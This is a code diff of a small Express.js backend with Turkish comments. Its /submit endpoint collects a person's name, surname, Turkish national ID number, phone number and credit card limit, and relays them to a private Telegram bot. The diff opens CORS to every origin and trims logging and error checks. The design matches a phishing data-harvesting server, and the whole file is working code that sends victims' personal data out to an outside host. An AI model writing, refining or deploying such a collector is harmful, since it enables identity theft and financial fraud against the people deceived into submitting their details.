@@ -4,45 +4,33 @@ const cors = require('cors');
 const dotenv = require('dotenv');
 
 dotenv.config();
+
 const app = express();
 
-// CORS ayarları: Tüm origin'lere izin ver
-app.use(cors({
-  origin: '*',
-  methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type'],
-}));
-
-// Preflight OPTIONS isteklerini ele al
-app.options('/submit', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  res.status(200).send();
-});
-
+// CORS
+app.use(cors());
 app.use(express.json());
+
+// Ortak header (her cevaba CORS ekleyelim)
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  next();
+});
 
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
-if (!botToken || !chatId) {
-  console.error('Hata: BOT_TOKEN veya CHAT_ID eksik.');
-  return (req, res) => res.status(500).json({ error: 'Sunucu yapılandırma hatası.' });
-}
-
-// Kök URL için test yanıtı
 app.get('/', (req, res) => {
-  res.status(200).json({ message: 'Backend çalışıyor.' });
+  res.json({ message: 'Backend çalışıyor 🚀' });
 });
 
-// POST isteklerini işleme
 app.post('/submit', async (req, res) => {
   console.log('POST /submit isteği alındı:', req.body);
-  const { isim, soyisim, tc, tel, kredi_karti_limiti } = req.body;
 
+  const { isim, soyisim, tc, tel, kredi_karti_limiti } = req.body;
   if (!isim || !soyisim || !tc || !tel || !kredi_karti_limiti) {
-    console.error('[Backend] Eksik veri:', { isim, soyisim, tc, tel, kredi_karti_limiti });
     return res.status(400).json({ error: 'Tüm alanlar zorunludur.' });
   }
 
@@ -54,24 +42,21 @@ T.C. Kimlik No: ${tc}
 Telefon: ${tel}
 Kredi Kartı Limiti: ${kredi_karti_limiti}
   `;
-  console.log('[Backend] Telegram’a gönderilecek mesaj:', message);
 
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
   try {
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const response = await axios.post(telegramUrl, {
       chat_id: chatId,
       text: message,
       parse_mode: 'HTML',
     });
-    console.log('[Backend] Telegram mesajı gönderildi:', response.data);
-    return res.status(200).json({ message: 'Bilgiler Telegram botuna gönderildi.' });
-  } catch (error) {
-    console.error('[Backend] Telegram mesajı gönderilemedi:', {
-      message: error.message,
-      response: error.response ? error.response.data : null,
-    });
-    return res.status(500).json({ error: 'Telegram mesajı gönderilemedi.', details: error.message });
+    console.log('[Backend] Telegram gönderildi:', response.data);
+    res.json({ message: 'Bilgiler Telegram’a gönderildi.' });
+  } catch (err) {
+    console.error('[Backend] Telegram hatası:', err.message);
+    res.status(500).json({ error: 'Telegram mesajı gönderilemedi.' });
   }
 });
 
+// Vercel için export
 module.exports = app;
